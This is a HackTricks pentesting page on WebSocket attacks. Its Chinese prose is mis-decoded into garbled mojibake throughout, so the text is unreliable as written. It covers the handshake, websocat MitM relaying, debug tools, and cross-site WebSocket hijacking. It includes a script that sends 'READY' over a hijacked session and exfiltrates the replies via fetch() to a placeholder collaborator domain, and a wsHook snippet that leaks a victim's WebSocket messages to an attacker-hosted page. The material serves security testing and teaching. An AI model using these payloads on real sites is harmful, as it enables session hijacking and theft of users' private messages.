# WebSocket æ”»å‡»

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä»€ä¹ˆæ˜¯ WebSockets

WebSocket è¿æ¥é€šè¿‡åˆå§‹çš„ **HTTP** æ¡æ‰‹å»ºç«‹ï¼Œæ—¨åœ¨å®ç° **é•¿æ—¶é—´** è¿æ¥ï¼Œå…è®¸éšæ—¶è¿›è¡ŒåŒå‘æ¶ˆæ¯ä¼ é€’ï¼Œè€Œæ— éœ€äº‹åŠ¡ç³»ç»Ÿã€‚è¿™ä½¿å¾— WebSockets ç‰¹åˆ«é€‚åˆéœ€è¦ **ä½å»¶è¿Ÿæˆ–æœåŠ¡å™¨å‘èµ·é€šä¿¡** çš„åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚å®æ—¶é‡‘èæ•°æ®æµã€‚

### WebSocket è¿æ¥çš„å»ºç«‹

æœ‰å…³å»ºç«‹ WebSocket è¿æ¥çš„è¯¦ç»†è¯´æ˜å¯ä»¥è®¿é—® [**è¿™é‡Œ**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)ã€‚æ€»ä¹‹ï¼ŒWebSocket è¿æ¥é€šå¸¸é€šè¿‡å®¢æˆ·ç«¯ JavaScript å‘èµ·ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` åè®®è¡¨ç¤ºä¸€ä¸ªä½¿ç”¨ **TLS** ä¿æŠ¤çš„ WebSocket è¿æ¥ï¼Œè€Œ `ws` è¡¨ç¤ºä¸€ä¸ª **ä¸å®‰å…¨çš„** è¿æ¥ã€‚

åœ¨è¿æ¥å»ºç«‹æœŸé—´ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´é€šè¿‡ HTTP è¿›è¡Œæ¡æ‰‹ã€‚æ¡æ‰‹è¿‡ç¨‹æ¶‰åŠæµè§ˆå™¨å‘é€è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”ï¼Œå¦‚ä»¥ä¸‹ç¤ºä¾‹æ‰€ç¤ºï¼š

æµè§ˆå™¨å‘é€æ¡æ‰‹è¯·æ±‚ï¼š
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
æœåŠ¡å™¨çš„æ¡æ‰‹å“åº”ï¼š
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
ä¸€æ—¦å»ºç«‹è¿æ¥ï¼Œæ¶ˆæ¯äº¤æ¢åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šä¿æŒå¼€æ”¾ã€‚

**WebSocket æ¡æ‰‹çš„å…³é”®ç‚¹ï¼š**

- `Connection` å’Œ `Upgrade` å¤´éƒ¨ä¿¡å·è¡¨ç¤º WebSocket æ¡æ‰‹çš„å¼€å§‹ã€‚
- `Sec-WebSocket-Version` å¤´éƒ¨æŒ‡ç¤ºæ‰€éœ€çš„ WebSocket åè®®ç‰ˆæœ¬ï¼Œé€šå¸¸ä¸º `13`ã€‚
- åœ¨ `Sec-WebSocket-Key` å¤´éƒ¨ä¸­å‘é€ä¸€ä¸ª Base64 ç¼–ç çš„éšæœºå€¼ï¼Œç¡®ä¿æ¯ä¸ªæ¡æ‰‹éƒ½æ˜¯å”¯ä¸€çš„ï¼Œè¿™æœ‰åŠ©äºé˜²æ­¢ç¼“å­˜ä»£ç†çš„é—®é¢˜ã€‚è¿™ä¸ªå€¼ä¸æ˜¯ç”¨äºèº«ä»½éªŒè¯ï¼Œè€Œæ˜¯ä¸ºäº†ç¡®è®¤å“åº”ä¸æ˜¯ç”±é…ç½®é”™è¯¯çš„æœåŠ¡å™¨æˆ–ç¼“å­˜ç”Ÿæˆçš„ã€‚
- æœåŠ¡å™¨å“åº”ä¸­çš„ `Sec-WebSocket-Accept` å¤´éƒ¨æ˜¯ `Sec-WebSocket-Key` çš„å“ˆå¸Œï¼ŒéªŒè¯æœåŠ¡å™¨æ‰“å¼€ WebSocket è¿æ¥çš„æ„å›¾ã€‚

è¿™äº›ç‰¹æ€§ç¡®ä¿æ¡æ‰‹è¿‡ç¨‹å®‰å…¨å¯é ï¼Œä¸ºé«˜æ•ˆçš„å®æ—¶é€šä¿¡é“ºå¹³é“è·¯ã€‚

### Linux æ§åˆ¶å°

æ‚¨å¯ä»¥ä½¿ç”¨ `websocat` ä¸ websocket å»ºç«‹åŸå§‹è¿æ¥ã€‚
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
æˆ–è€…åˆ›å»ºä¸€ä¸ª websocat æœåŠ¡å™¨ï¼š
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket è¿æ¥

å¦‚æœä½ å‘ç°å®¢æˆ·ç«¯ä»å½“å‰æœ¬åœ°ç½‘ç»œè¿æ¥åˆ° **HTTP websocket**ï¼Œä½ å¯ä»¥å°è¯•è¿›è¡Œ [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) æ¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ‰§è¡Œ MitM æ”»å‡»ã€‚\
ä¸€æ—¦å®¢æˆ·ç«¯å°è¯•è¿æ¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

æ‚¨å¯ä»¥ä½¿ç”¨ **å·¥å…·** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **è‡ªåŠ¨å‘ç°ã€æŒ‡çº¹è¯†åˆ«å’Œæœç´¢å·²çŸ¥çš„** **æ¼æ´** **åœ¨ websockets ä¸­ã€‚**

### Websocket Debug tools

* **Burp Suite** ä»¥ä¸å¸¸è§„ HTTP é€šä¿¡éå¸¸ç›¸ä¼¼çš„æ–¹å¼æ”¯æŒ MitM websockets é€šä¿¡ã€‚
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite æ‰©å±•** å°†å…è®¸æ‚¨é€šè¿‡è·å– **å†å²è®°å½•**ã€è®¾ç½® **æ‹¦æˆªè§„åˆ™**ã€ä½¿ç”¨ **åŒ¹é…å’Œæ›¿æ¢** è§„åˆ™ã€ä½¿ç”¨ **Intruder** å’Œ **AutoRepeater** æ›´å¥½åœ°ç®¡ç† Burp ä¸­çš„ Websocket é€šä¿¡ã€‚
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** ä»£è¡¨ "**WebSocket/Socket.io Proxy**"ï¼Œè¿™ä¸ªç”¨ Node.js ç¼–å†™çš„å·¥å…·æä¾›äº†ä¸€ä¸ªç”¨æˆ·ç•Œé¢æ¥ **æ•è·ã€æ‹¦æˆªã€å‘é€è‡ªå®šä¹‰** æ¶ˆæ¯å¹¶æŸ¥çœ‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ‰€æœ‰ WebSocket å’Œ Socket.IO é€šä¿¡ã€‚
* [**wsrepl**](https://github.com/doyensec/wsrepl) æ˜¯ä¸€ä¸ª **äº¤äº’å¼ websocket REPL**ï¼Œä¸“é—¨ä¸ºæ¸—é€æµ‹è¯•è®¾è®¡ã€‚å®ƒæä¾›äº†ä¸€ä¸ªè§‚å¯Ÿ **ä¼ å…¥ websocket æ¶ˆæ¯å’Œå‘é€æ–°æ¶ˆæ¯** çš„æ¥å£ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„æ¡†æ¶æ¥ **è‡ªåŠ¨åŒ–** è¿™ç§é€šä¿¡ã€‚&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) æ˜¯ä¸€ä¸ª **ç”¨äºä¸å…¶ä»–ç½‘ç«™é€šä¿¡** çš„ **web**ï¼Œä½¿ç”¨ **websockets**ã€‚
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) åœ¨å…¶ä»–ç±»å‹çš„é€šä¿¡/åè®®ä¸­ï¼Œå®ƒæä¾›äº†ä¸€ä¸ª **ç”¨äºä¸å…¶ä»–ç½‘ç«™é€šä¿¡** çš„ **web**ï¼Œä½¿ç”¨ **websockets**ã€‚

## Websocket Lab

åœ¨ [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) ä¸­ï¼Œæ‚¨æœ‰ä¸€ä¸ªä»£ç æ¥å¯åŠ¨ä¸€ä¸ªä½¿ç”¨ websockets çš„ webï¼Œåœ¨ [**è¿™ç¯‡æ–‡ç« **](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) ä¸­æ‚¨å¯ä»¥æ‰¾åˆ°è§£é‡Šã€‚

## Cross-site WebSocket hijacking (CSWSH)

**è·¨ç«™ç‚¹ WebSocket åŠ«æŒ**ï¼Œä¹Ÿç§°ä¸º **è·¨æº WebSocket åŠ«æŒ**ï¼Œè¢«è¯†åˆ«ä¸ºå½±å“ WebSocket æ¡æ‰‹çš„ **[è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF)](csrf-cross-site-request-forgery.md)** çš„ç‰¹å®šæ¡ˆä¾‹ã€‚æ­¤æ¼æ´å‘ç”Ÿåœ¨ WebSocket æ¡æ‰‹ä»…é€šè¿‡ **HTTP cookies** è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œæ²¡æœ‰ **CSRF tokens** æˆ–ç±»ä¼¼çš„å®‰å…¨æªæ–½ã€‚

æ”»å‡»è€…å¯ä»¥é€šè¿‡æ‰˜ç®¡ä¸€ä¸ª **æ¶æ„ç½‘é¡µ** æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯¥ç½‘é¡µå‘èµ·ä¸æ˜“å—æ”»å‡»åº”ç”¨ç¨‹åºçš„è·¨ç«™ç‚¹ WebSocket è¿æ¥ã€‚å› æ­¤ï¼Œè¿™ä¸ªè¿æ¥è¢«è§†ä¸ºå—å®³è€…ä¸åº”ç”¨ç¨‹åºçš„ä¼šè¯çš„ä¸€éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¼šè¯å¤„ç†æœºåˆ¶ä¸­ç¼ºä¹ CSRF ä¿æŠ¤ã€‚

### Simple Attack

è¯·æ³¨æ„ï¼Œå½“ **å»ºç«‹** ä¸€ä¸ª **websocket** è¿æ¥æ—¶ï¼Œ**cookie** ä¼šè¢« **å‘é€** åˆ°æœåŠ¡å™¨ã€‚**æœåŠ¡å™¨** å¯èƒ½ä¼šä½¿ç”¨å®ƒæ¥ **å…³è”** æ¯ä¸ª **ç‰¹å®š** **ç”¨æˆ·** ä¸å…¶ **åŸºäºå‘é€çš„ cookie çš„ websocket** **ä¼šè¯**ã€‚

ç„¶åï¼Œå¦‚æœ **ä¾‹å¦‚** **websocket** **æœåŠ¡å™¨** **å‘é€å›ç”¨æˆ·çš„å¯¹è¯å†å²**ï¼Œå¦‚æœå‘é€äº†å¸¦æœ‰ "**READY"** çš„æ¶ˆæ¯ï¼Œé‚£ä¹ˆä¸€ä¸ª **ç®€å•çš„ XSS** å»ºç«‹è¿æ¥ï¼ˆ**cookie** å°† **è‡ªåŠ¨å‘é€** ä»¥æˆæƒå—å®³è€…ç”¨æˆ·ï¼‰ **å‘é€** "**READY**" å°†èƒ½å¤Ÿ **æ£€ç´¢** å¯¹è¯çš„ **å†å²**ã€‚
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### è·¨æº + ä¸åŒå­åŸŸçš„ Cookie

åœ¨è¿™ç¯‡åšå®¢æ–‡ç«  [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) ä¸­ï¼Œæ”»å‡»è€…æˆåŠŸåœ° **åœ¨ä¸€ä¸ªå­åŸŸä¸­æ‰§è¡Œä»»æ„ Javascript**ï¼Œè¯¥å­åŸŸæ˜¯è¿›è¡Œ Websocket é€šä¿¡çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚å› ä¸ºå®ƒæ˜¯ä¸€ä¸ª **å­åŸŸ**ï¼Œæ‰€ä»¥ **cookie** è¢« **å‘é€**ï¼Œè€Œä¸”å› ä¸º **Websocket æ²¡æœ‰æ­£ç¡®æ£€æŸ¥ Origin**ï¼Œå› æ­¤å¯ä»¥ä¸å…¶é€šä¿¡å¹¶ **çªƒå–ä»¤ç‰Œ**ã€‚

### ä»ç”¨æˆ·é‚£é‡Œçªƒå–æ•°æ®

å¤åˆ¶æ‚¨æƒ³è¦æ¨¡ä»¿çš„ Web åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ .html æ–‡ä»¶ï¼‰ï¼Œå¹¶åœ¨è¿›è¡Œ Websocket é€šä¿¡çš„è„šæœ¬ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
ç°åœ¨ä» [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) ä¸‹è½½ `wsHook.js` æ–‡ä»¶ï¼Œå¹¶**å°†å…¶ä¿å­˜åœ¨åŒ…å«ç½‘é¡µæ–‡ä»¶çš„æ–‡ä»¶å¤¹ä¸­**ã€‚\
é€šè¿‡æš´éœ²ç½‘ç»œåº”ç”¨ç¨‹åºå¹¶ä½¿ç”¨æˆ·è¿æ¥åˆ°å®ƒï¼Œæ‚¨å°†èƒ½å¤Ÿçªƒå–é€šè¿‡ websocket å‘é€å’Œæ¥æ”¶çš„æ¶ˆæ¯ï¼š
```javascript
sudo python3 -m http.server 80
```
## ç«äº‰æ¡ä»¶

WebSockets ä¸­çš„ç«äº‰æ¡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œ[æŸ¥çœ‹æ­¤ä¿¡æ¯ä»¥äº†è§£æ›´å¤š](race-condition.md#rc-in-websockets)ã€‚

## å…¶ä»–æ¼æ´

ç”±äº Web Sockets æ˜¯ä¸€ç§**å‘æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å‘é€æ•°æ®**çš„æœºåˆ¶ï¼Œå…·ä½“å–å†³äºæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¦‚ä½•å¤„ç†ä¿¡æ¯ï¼Œ**Web Sockets å¯ä»¥è¢«ç”¨æ¥åˆ©ç”¨å…¶ä»–å‡ ç§æ¼æ´ï¼Œå¦‚ XSSã€SQLi æˆ–ä»»ä½•å…¶ä»–å¸¸è§çš„ç½‘ç»œæ¼æ´ï¼Œä½¿ç”¨æ¥è‡ª websocket çš„ç”¨æˆ·è¾“å…¥ã€‚**

## **WebSocket èµ°ç§**

æ­¤æ¼æ´å¯èƒ½å…è®¸æ‚¨**ç»•è¿‡åå‘ä»£ç†é™åˆ¶**ï¼Œä½¿å…¶ç›¸ä¿¡**å·²å»ºç«‹ websocket é€šä¿¡**ï¼ˆå³ä½¿è¿™ä¸æ˜¯çœŸçš„ï¼‰ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®éšè—çš„ç«¯ç‚¹**ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
